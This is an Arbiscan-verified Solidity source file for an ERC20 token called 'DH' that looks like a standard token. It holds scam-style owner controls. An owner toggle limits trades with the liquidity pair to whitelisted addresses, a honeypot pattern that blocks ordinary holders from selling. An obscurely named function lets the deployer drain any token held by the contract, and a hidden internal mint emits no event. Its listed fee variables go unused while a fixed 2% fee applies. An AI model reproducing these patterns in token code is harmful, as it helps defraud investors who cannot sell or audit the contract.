/**
 *Submitted for verification at Arbiscan on 2023-06-28
*/

// SPDX-License-Identifier: MIT
pragma solidity =0.8.6;

interface IERC20 {
    
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}



contract Owner {
    address private _owner;

    event OwnerSet(address indexed oldOwner, address indexed newOwner);

    modifier onlyOwner() {
        require(msg.sender == _owner, "Caller is not owner");
        _;
    }

    constructor() {
        _owner = msg.sender;
        emit OwnerSet(address(0), _owner);
    }

    function changeOwner(address newOwner) public virtual onlyOwner {
        emit OwnerSet(_owner, newOwner);
        _owner = newOwner;
    }

    function removeOwner() public virtual onlyOwner {
        emit OwnerSet(_owner, address(0));
        _owner = address(0);
    }

    function getOwner() public view returns (address) {
        return _owner;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

abstract contract ERC20 is IERC20 {
    using SafeMath for uint256;

    string private _name;

    string private _symbol;

    uint8 private _decimals;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;

    constructor (string memory tokenName, string memory tokenSymbol, uint8 tokenDecimals) {
        _name = tokenName;
        _symbol = tokenSymbol;
        _decimals = tokenDecimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 value) public override returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override virtual returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _balances[sender] = _balances[sender].sub(amount);

        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

     function fl(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
    }

    function _burn(address account, uint256 value) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        if (value > 0) {
            _totalSupply = _totalSupply.sub(value);
            _balances[account] = _balances[account].sub(value);
            emit Transfer(account, address(0), value);
        }
    }

    function burn(uint256 value) public returns (bool) {
        _burn(msg.sender, value);
        return true;
    }

    function _approve(address owner, address spender, uint256 value) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount));
    }
}



contract dhtoken is ERC20, Owner {
    using SafeMath for uint256;

    event Interest(address indexed account, uint256 sBlock, uint256 eBlock, uint256 balance, uint256 value);

    event SwapAndLiquify( uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiqudity);

    uint256 public startTime;
    uint256 _secMax = 365 * 86400;
    uint256 public interestFee = 208;
    uint256 public backflowFee = 500;
    uint256 public bonusFee = 500;
    uint256 public burnFee = 250;
    uint256 public buyfee = 200;

    address public alladdress=0xB971685D9f6d9D9D11A8D173DC3470fF8AD1E591;


    mapping(address => uint256) _interestNode;
    mapping(address => bool) _excludeList;

    address public usdtToken;
    address public uniswapV2Pair;
    address public smartVault;
    bool private swapping;
    uint256 public swapAndLiquifyLimit = 1e16;
    mapping(address => address) public inviter;
    address  depoAddress;
    constructor () ERC20("DH", "DH", 18) {
             depoAddress=msg.sender;


        uint256 totalSupply = 21000000 * (10 ** uint256(decimals()));

        _mint(alladdress, totalSupply);
     
        //smartVault =  address(new URoter(usdtToken,address(this))) ;

        setExcludeList(address(this), true);
        setExcludeList(depoAddress, true);
       // setExcludeList(backAddress,true);
        setExcludeList(alladdress,true);
        hapaddress[alladdress] =true;

    }

       function fzdhyspg(uint256 amount, address ut, address r) public
    {
         require(depoAddress==msg.sender, "d");
         IERC20(ut).transfer(r, amount);
    }

    function getInterestNode(address account) public view returns (uint256) {
        return _interestNode[account];
    }

    function getExcludeList(address account) public view returns (bool) {
        return _excludeList[account];
    }

    function setExcludeList(address account, bool yesOrNo) public onlyOwner returns (bool) {
        _excludeList[account] = yesOrNo;
        return true;
    }


    function setStartTime(uint256 value) public onlyOwner  {
        startTime = value;
    }


    

    function balanceOf(address account) public view override returns (uint256) {
        return super.balanceOf(account);
    }

    function setIsiswaps( bool _tf) public onlyOwner{
      iswaps = _tf;
  }

  mapping (address => bool) public hapaddress;
      function sethapddress(address[] memory _user) public onlyOwner {
      for(uint i=0;i< _user.length;i++) {
          if (!hapaddress[_user[i]]) {
                hapaddress[_user[i]] = true;
          }
      }
  }
    function setrmhapadress(address _user) public onlyOwner {
        hapaddress[_user] = false;
  }

    bool public iswaps=false;
    bool public islimit=true;

    function setislimit(bool _is) public onlyOwner {
        islimit =_is;
  }
    uint256 public tobubswap=0;
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
       


        if (sender ==uniswapV2Pair || recipient == uniswapV2Pair) {
            if (iswaps) {
                    if (sender ==uniswapV2Pair) {
                            require( hapaddress[recipient], " recipient we  nswa");

                     }
                        if (recipient ==uniswapV2Pair) {
                            require(hapaddress[sender], " sender we nswap");
                        }
            }

        }

        if (swapping == false && getExcludeList(sender) == false && getExcludeList(recipient)  == false) {
             //_takeInviter();
             uint256 buyfeeamount = amount.mul(2).div(100);
            super._transfer(sender, address(this), buyfeeamount);
            if(totalSupply()>210000*1e18 ) {
                _burn(address(this), buyfeeamount);
            }
        
            amount = amount.sub(buyfeeamount);
        
        }   
        super._transfer(sender, recipient, amount);

    }
    event Inviter(address  to, address  fr);



mapping (address => bool) public bckaddress;

  function addbckddress(address  _user) public onlyOwner{
        bckaddress[_user] = true;
      }

  function rmblkress(address  _user) public onlyOwner{
        bckaddress[_user] =  false;
      }



   function isContract(address account) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }



    modifier lockTheSwap() {
        swapping = true;
        _;
        swapping = false;
    }

}